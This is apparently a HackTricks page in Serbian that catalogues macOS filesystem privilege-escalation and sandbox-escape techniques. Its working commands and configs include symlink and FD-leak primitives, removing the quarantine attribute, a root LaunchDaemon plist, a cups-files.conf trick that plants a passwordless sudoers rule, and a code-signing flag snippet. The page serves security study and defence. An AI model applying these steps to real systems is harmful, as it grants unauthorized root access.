# macOS FS trikovi

{{#include ../../../../banners/hacktricks-training.md}}

## Kombinacije POSIX dozvola

Za **direktorijum**, tri bita dozvola znače nešto drugačije nego za običnu datoteku. `chmod(1)` naziva execute bit „**search**” kada se primeni na direktorijum:<sup>[[2]](#references)</sup>

> `0100` Za datoteke, dozvoljava izvršavanje vlasniku. Za direktorijume, dozvoljava vlasniku da **pretražuje** direktorijum.

- **read** - možete **nabrojati** stavke direktorijuma (izlistati imena).
- **write** - možete **kreirati, preimenovati i brisati stavke** u direktorijumu. Imajte na umu da je ovo svojstvo *roditeljskog* direktorijuma, a ne datoteke: možete obrisati datoteku koju ne možete da čitate ili menjate, sve dok možete da menjate njen roditeljski direktorijum.
  - Da biste obrisali **poddirektorijum**, on mora biti prazan, što zauzvrat zahteva dovoljna prava za uklanjanje svega što se u njemu nalazi.
  - Ako direktorijum ima **sticky bit** (`S_ISVTX`, kao `/tmp`), ovo je ograničeno — POSIX navodi da proces tada može da uklanja ili preimenuje datoteke u njemu samo ako je vlasnik datoteke, vlasnik direktorijuma ili ima odgovarajuće privilegije.<sup>[[1]](#references)</sup>
- **execute / search** - možete **prolaziti kroz** direktorijum. Razrešavanje putanje locira svaku komponentu „u direktorijumu koji je naveden njenom prethodnom komponentom”, pa **gubitak prava pretrage na bilo kojoj pojedinačnoj komponenti prefiksa putanje čini sve ispod nje nedostupnim putem putanje**, čak i ako je krajnja datoteka čitljiva svima.<sup>[[1]](#references)</sup>

### Opasne kombinacije

**Kako prepisati datoteku/fasciklu čiji je vlasnik root**, ali:

- Vlasnik jednog roditeljskog **direktorijuma** u putanji je korisnik
- Vlasnik jednog roditeljskog **direktorijuma** u putanji je **grupa korisnika** sa **write** pristupom
- **Grupa** korisnika ima **write** pristup **datoteci**

Uz bilo koju od prethodnih kombinacija, napadač bi mogao da **ubaci** **sym/hard link** na očekivanu putanju i tako dobije privilegiju za proizvoljno pisanje.

### Poseban slučaj direktorijuma root R+X

Ovo direktno proizlazi iz prethodno opisanog pravila razrešavanja putanje. Ako **direktorijum daje samo R+X root-u**, datoteke unutar njega su svima ostalima nedostupne *putem putanje* — ali **sami bitovi dozvola datoteka i dalje mogu biti permisivni**. Jedina prepreka je direktorijum.

Dakle, svaki primitiv koji vam omogućava da izvučete datoteku **iz tog direktorijuma** — privilegovani proces koji **premešta/preimenuje/kopira** putanju koju je izabrao napadač na lokaciju kroz koju *možete* da prolazite — omogućava proizvoljno čitanje, bez potrebe da se zaobiđu dozvole same datoteke:

```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```

Potražite privilegovane alate za premeštanje datoteka (instalatore, rotatore logova, prikupljače izveštaja o padovima/dijagnostici, funkcije za pravljenje rezervnih kopija i „izvoz“) koji prihvataju putanju do izvorne datoteke od korisnika sa nižim privilegijama.

## Simboličke veze / tvrde veze

### Dozvoljena datoteka/fascikla

Ako privilegovani proces upisuje podatke u **datoteku** koju može da **kontroliše** korisnik sa **nižim privilegijama**, ili koju je korisnik sa nižim privilegijama **prethodno kreirao**, taj korisnik može samo da je **usmeri na drugu datoteku** pomoću simboličke ili tvrde veze, pa će privilegovani proces upisivati u tu datoteku.

Proverite i ostale odeljke da biste videli gde napadač može da **zloupotrebi proizvoljan upis radi eskalacije privilegija**.

### Otvaranje `O_NOFOLLOW`

Prema [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *„Ako se u maski koristi `O_NOFOLLOW`, a ciljna datoteka prosleđena funkciji `open()` jeste simbolička veza, poziv funkcije `open()` neće uspeti.“* Proverava se samo **poslednja** komponenta — sve **međukomponente** se i dalje razrešavaju i prate. Dakle, napadač i dalje može da napadne programera koji je „zaštitio“ upis pomoću `O_NOFOLLOW` tako što će postaviti simboličku vezu u bilo koju **nadređenu fasciklu** ciljne putanje.<sup>[[3]](#references)</sup>

Ista man stranica opisuje zastavice koje zaista zatvaraju tu rupu:<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *„ako je ... bilo koja komponenta putanje prosleđene funkciji `open()` simbolička veza, poziv funkcije `open()` neće uspeti.“*
- **`O_RESOLVE_BENEATH`** — *„ako ... razrešavanje navedene putanje izađe iz fascikle povezane sa fd-om, poziv funkcije `openat()` neće uspeti.“*

U suprotnom, preostali načini da se zaustave zamene simboličkih veza u međudelovima putanje jesu korišćenje funkcije `openat()` relativno u odnosu na FD fascikle koji ste već proverili ili korišćenje funkcije `realpath()` uz ponovnu proveru.

## .fileloc

Datoteke sa ekstenzijom **`.fileloc`** mogu da upućuju na druge aplikacije ili izvršne datoteke, tako da će se pri njihovom otvaranju pokrenuti ta aplikacija/izvršna datoteka.\
Primer:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>URL</key>
    <string>file:///System/Applications/Calculator.app</string>
    <key>URLPrefix</key>
    <integer>0</integer>
</dict>
</plist>
```

## Deskriptori datoteka

### Leak FD (bez `O_CLOEXEC`)

Ako poziv funkcije `open` nema zastavicu `O_CLOEXEC`, deskriptor datoteke naslediće child process. Dakle, ako privilegovani proces otvori privilegovanu datoteku i pokrene proces kojim upravlja napadač, napadač će **naslediti FD za privilegovanu datoteku**.

Klasičan primer je **`DYLD_PRINT_TO_FILE` LPE u OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld` je uvažavao `DYLD_PRINT_TO_FILE=/path` čak i u **restricted (suid root) binarnim datotekama**, jer se ta promenljiva parsirala izvan funkcije `processDyldEnvironmentVariable()`.
- Pozivao je `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, čime je **kreirao datoteku u vlasništvu root-a na proizvoljnoj putanji**.
- FD **nikada nije bio zatvoren i nije imao zastavicu close-on-exec**, pa je svaki child process suid binarne datoteke nasleđivao **FD za pisanje u datoteku u vlasništvu root-a**.
- Pokretanje, na primer, `DYLD_PRINT_TO_FILE=/etc/target suid_binary`, a zatim čitanje broja nasleđenog FD-a u child procesu omogućavalo je proizvoljno pisanje u datoteke u vlasništvu root-a; `fcntl(fd, F_SETFL, 0)` je čak uklanjao `O_APPEND`, čime je omogućeno prepisivanje umesto dopisivanja.

Isti obrazac javlja se kad god privilegovani proces otvori datoteku **pre nego što izvrši** nešto čime vi upravljate (pomoćne alate, editore u stilu `crontab`-a pokrenute preko `$EDITOR`, datoteke za logovanje/debug otvorene putanjom iz env-var promenljive...). Nabrojte FD-ove koje ste nasledili pomoću:

```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```

Sve iznad `2` što upućuje na fajl koji ne možete sami da otvorite predstavlja arbitrary-write (ili arbitrary-read) primitive.

## Izbegavajte trikove sa quarantine xattrs

### Uklonite ga

```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```

### uchg / uchange / uimmutable flag

Ako datoteka/fascikla ima ovaj nepromenljivi atribut, neće biti moguće dodati xattr na nju

```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```

### Sistemi datoteka bez podrške za xattr

Ne čuva svaki sistem datoteka koji macOS može da montira **proširene atribute** nativno. HFS+ i APFS ih podržavaju; **FAT32, exFAT i (većina) NFS montiranja ih ne podržavaju** — macOS ih emulira upisivanjem prateće datoteke **AppleDouble** pod nazivom `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

To je važno za karantin, jer xattr opstaje samo ako zaista može da se upiše **i ponovo pročita** sa istog volumena:

```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```

Ako se volumen kasnije pročita preko putanje koja ignoriše prateću datoteku `._` (ili se prateća datoteka ukloni/obriše), datoteka stiže **bez oznake karantina** — a nezaštićena `.app` datoteka dovoljna je za izlazak iz App Sandbox-a, kao što je objašnjeno u [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### ACL writeextattr i ponašanje karantina AppleDouble

Primer ACL-a `writeextattr`, mehanizam AppleDouble `com.apple.acl.text` i koraci za izradu i proveru prateće datoteke opisani su u [reprodukciji zaobilaženja karantina pomoću AppleDouble/ACL-a](macos-appledouble-acl-quarantine-bypass.md).

## Zaobilaženje provera potpisa

### Zaobilaženje provera platformskih binarnih datoteka

Neke bezbednosne provere utvrđuju da li je binarna datoteka **platformska binarna datoteka**, na primer da bi dozvolile povezivanje sa XPC servisom. Međutim, kao što je prikazano u opisu zaobilaženja na https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, ovu proveru je moguće zaobići tako što se pribavi platformska binarna datoteka (kao što je /bin/ls), a zatim se exploit ubaci preko dyld-a pomoću promenljive okruženja `DYLD_INSERT_LIBRARIES`.<sup>[[7]](#references)</sup>

### Zaobilaženje oznaka `CS_REQUIRE_LV` i `CS_FORCED_LV`

Izvršna binarna datoteka može da izmeni sopstvene oznake i zaobiđe provere pomoću koda kao što je ovaj:<sup>[[7]](#references)</sup>

```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```



## Bypass Code Signatures

Bundle-ovi sadrže datoteku **`_CodeSignature/CodeResources`** koja sadrži **hash** svake pojedinačne **datoteke** u **bundle-u**. Imajte na umu da je hash datoteke CodeResources takođe **ugrađen u izvršnu datoteku**, pa ni nju ne možemo menjati.

Međutim, postoje neke datoteke čiji se potpis neće proveravati; one imaju ključ omit u plist-u, na primer:

```xml
<dict>
...
	<key>rules</key>
	<dict>
...
		<key>^Resources/.*\.lproj/locversion.plist$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>1100</real>
		</dict>
...
	</dict>
	<key>rules2</key>
...
		<key>^(.*/index.html)?\.DS_Store$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>2000</real>
		</dict>
...
		<key>^PkgInfo$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>20</real>
		</dict>
...
		<key>^Resources/.*\.lproj/locversion.plist$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>1100</real>
		</dict>
...
</dict>
```

Moguće je izračunati potpis resursa iz CLI-ja pomoću:

```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```

## Montiranje dmg-ova

Korisnik može da montira prilagođeni dmg kreiran čak i preko nekih postojećih fascikli. Ovako možete da kreirate prilagođeni dmg paket sa prilagođenim sadržajem:

```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```

Obično macOS montira diskove komunicirajući sa Mach servisom `com.apple.DiskArbitrarion.diskarbitrariond` (koji pruža `/usr/libexec/diskarbitrationd`). Ako se parametar `-d` doda u plist datoteku LaunchDaemons-a i servis se ponovo pokrene, logovi će biti zapisivani u `/var/log/diskarbitrationd.log`.\
Međutim, moguće je koristiti alate kao što su `hdik` i `hdiutil` za direktnu komunikaciju sa kext-om `com.apple.driver.DiskImages`.

## Proizvoljni upisi

### Periodične shell skripte

Ako bi vaša skripta mogla da se tumači kao **shell skripta**, mogli biste da zamenite shell skriptu **`/etc/periodic/daily/999.local`**, koja se pokreće svakog dana.

Možete **simulirati** izvršavanje ove skripte pomoću: **`sudo periodic daily`**

### Daemoni

Zapišite proizvoljni **LaunchDaemon**, kao što je **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**, sa plist-om koji pokreće proizvoljnu skriptu, na primer:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
    <dict>
        <key>Label</key>
        <string>com.sample.Load</string>
        <key>ProgramArguments</key>
        <array>
            <string>/Applications/Scripts/privesc.sh</string>
        </array>
        <key>RunAtLoad</key>
        <true/>
    </dict>
</plist>
```

Samo generišite skriptu `/Applications/Scripts/privesc.sh` sa **komandama** koje želite da pokrenete kao root.

### Sudoers fajl

Ako imate **arbitrary write**, možete da kreirate fajl u fascikli **`/etc/sudoers.d/`** koji vam dodeljuje **sudo** privilegije.

### PATH datoteke

Datoteka **`/etc/paths`** je jedno od glavnih mesta koja popunjavaju promenljivu okruženja PATH. Morate biti root da biste je prepisali, ali ako skripta iz **privilegovanog procesa** pokreće neku **komandu bez pune putanje**, možda ćete moći da je **hijack**-ujete izmenom ove datoteke.

Možete i da upisujete datoteke u **`/etc/paths.d`** kako biste dodali nove fascikle u promenljivu okruženja `PATH`.

### cups-files.conf

Ova tehnika je korišćena u [ovom writeup-u](https://www.kandji.io/blog/macos-audit-story-part1).<sup>[[8]](#references)</sup>

Kreirajte datoteku `/etc/cups/cups-files.conf` sa sledećim sadržajem:

```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```

Ovo će kreirati fajl `/etc/sudoers.d/lpe` sa dozvolama 777. Dodatni besmisleni sadržaj na kraju služi za pokretanje kreiranja dnevnika grešaka.

Zatim upišite potrebnu konfiguraciju u `/etc/sudoers.d/lpe` da biste eskalirali privilegije, na primer `%staff ALL=(ALL) NOPASSWD:ALL`.

Zatim ponovo izmenite fajl `/etc/cups/cups-files.conf` tako da sadrži `LogFilePerm 700`, čime će nova sudoers datoteka postati validna kada pozovete `cupsctl`.

### Sandbox Escape

Moguće je izaći iz macOS sandbox-a pomoću proizvoljnog upisa u FS. Primeri su navedeni na stranici [macOS Auto Start](../../../../macos-auto-start-locations.md), ali čest način je da upišete datoteku sa Terminal podešavanjima u `~/Library/Preferences/com.apple.Terminal.plist` koja izvršava komandu pri pokretanju, pa da je pozovete pomoću `open`.

## Kreiranje fajlova drugih korisnika u koje možete da upisujete

Veoma čest privesc primitiv je da **privilegovani proces kreira fajl za vas** u direktorijumu koji kontrolišete, a zatim da zadržite **pristup za upisivanje** u taj fajl. Potrebne su dve stvari:

1. Direktorijum koji posedujete (ili u kojem možete da podesite **nasleđeni ACL**), kako bi sve što se kreira u njemu nasledilo vaše dozvole.
2. Privilegovani/`suid` proces kojem možete da zadate **gde** da kreira fajl — obično putem promenljive okruženja za debugovanje/dnevnik, konfiguracione datoteke ili XPC API-ja pomoćnog procesa.

Deo sa **nasleđenim ACL-om** omogućava vam da upisujete u kreirani fajl iako je u vlasništvu drugog korisnika. Zastavice nasleđivanja `file_inherit` / `directory_inherit` dokumentovane su u [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):<sup>[[2]](#references)</sup>

```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```

Sada je svaka datoteka koju privilegovani proces kreira unutar `$DIRNAME` **zapisiva za vas**. Ako je taj direktorijum i lokacija sa koje se kasnije **izvršava kao root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, direktorijum LaunchDaemon-a...), ovo je direktno podizanje privilegija do root-a. Pogledajte odeljke [Sudoers File](#sudoers-file) i [cups-files.conf](#cups-filesconf) iznad da biste videli šta da upišete u datoteku kada je dobijete.

Za kompletan razrađeni primer lanca „promenljiva okruženja navede root proces da kreira datoteku, a FD procuri do vas“, pogledajte [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) iznad.

## POSIX deljena memorija

**POSIX deljena memorija** omogućava procesima u operativnim sistemima usklađenim sa POSIX-om da pristupaju zajedničkoj memorijskoj oblasti, čime se omogućava brža komunikacija u poređenju sa drugim metodama međuprocesne komunikacije. Ona podrazumeva kreiranje ili otvaranje objekta deljene memorije pomoću `shm_open()`, podešavanje njegove veličine pomoću `ftruncate()` i mapiranje u adresni prostor procesa pomoću `mmap()`. Procesi zatim mogu direktno da čitaju i upisuju podatke u ovu memorijsku oblast. Da bi se upravljalo istovremenim pristupom i sprečilo oštećenje podataka, često se koriste mehanizmi za sinhronizaciju kao što su mutex-i ili semafori. Na kraju, procesi odmapiraju i zatvaraju deljenu memoriju pomoću `munmap()` i `close()`, a po želji uklanjaju objekat memorije pomoću `shm_unlink()`. Ovaj sistem je naročito efikasan za brzo IPC u okruženjima u kojima više procesa mora brzo da pristupa zajedničkim podacima.

<details>

<summary>Primer koda proizvođača</summary>

```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *name = "/my_shared_memory";
    const int SIZE = 4096; // Size of the shared memory object

    // Create the shared memory object
    int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
    if (shm_fd == -1) {
        perror("shm_open");
        return EXIT_FAILURE;
    }

    // Configure the size of the shared memory object
    if (ftruncate(shm_fd, SIZE) == -1) {
        perror("ftruncate");
        return EXIT_FAILURE;
    }

    // Memory map the shared memory
    void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }

    // Write to the shared memory
    sprintf(ptr, "Hello from Producer!");

    // Unmap and close, but do not unlink
    munmap(ptr, SIZE);
    close(shm_fd);

    return 0;
}
```

</details>

<details>

<summary>Primer potrošačkog koda</summary>

```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *name = "/my_shared_memory";
    const int SIZE = 4096; // Size of the shared memory object

    // Open the shared memory object
    int shm_fd = shm_open(name, O_RDONLY, 0666);
    if (shm_fd == -1) {
        perror("shm_open");
        return EXIT_FAILURE;
    }

    // Memory map the shared memory
    void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        return EXIT_FAILURE;
    }

    // Read from the shared memory
    printf("Consumer received: %s\n", (char *)ptr);

    // Cleanup
    munmap(ptr, SIZE);
    close(shm_fd);
    shm_unlink(name); // Optionally unlink

    return 0;
}

```

</details>

## macOS Guarded Descriptors

**macOS Guarded descriptors** su bezbednosna funkcija uvedena u macOS radi poboljšanja bezbednosti i pouzdanosti **operacija sa deskriptorima datoteka** u korisničkim aplikacijama. Ovi zaštićeni deskriptori omogućavaju pridruživanje određenih ograničenja ili „zaštita” deskriptorima datoteka, koje sprovodi kernel.

Ova funkcija je naročito korisna za sprečavanje određenih vrsta bezbednosnih ranjivosti, kao što su **neovlašćen pristup datotekama** ili **race conditions**. Do ovih ranjivosti dolazi, na primer, kada nit pristupa opisu datoteke, čime **drugoj ranjivoj niti omogućava pristup**, ili kada ranjivi podređeni proces **nasledi** deskriptor datoteke. Neke funkcije povezane s ovom funkcionalnošću su:

- `guarded_open_np`: Otvara deskriptor datoteke sa zaštitom
- `guarded_close_np`: Zatvara ga
- `change_fdguard_np`: Menja zastavice zaštite na deskriptoru (može i da ukloni zaštitu)

## References

- [1] [POSIX.1-2024 — Osnovne definicije, pogl. 4 (Dozvole za pristup datotekama, zaštita direktorijuma, razrešavanje putanja)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - Lokalno podizanje privilegija putem DYLD_PRINT_TO_FILE u OS X 10.10](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [5] [The Eclectic Light Company - Koji sistemi datoteka i cloud servisi čuvaju extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [7] [Mickey (Jhftss) - Nova era zaobilaženja macOS sandboxa](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Otkrivanje Apple ranjivosti: priča o reviziji diskarbitrationd i storagekitd, 1. deo](https://www.kandji.io/blog/macos-audit-story-part1)
{{#include ../../../../banners/hacktricks-training.md}}
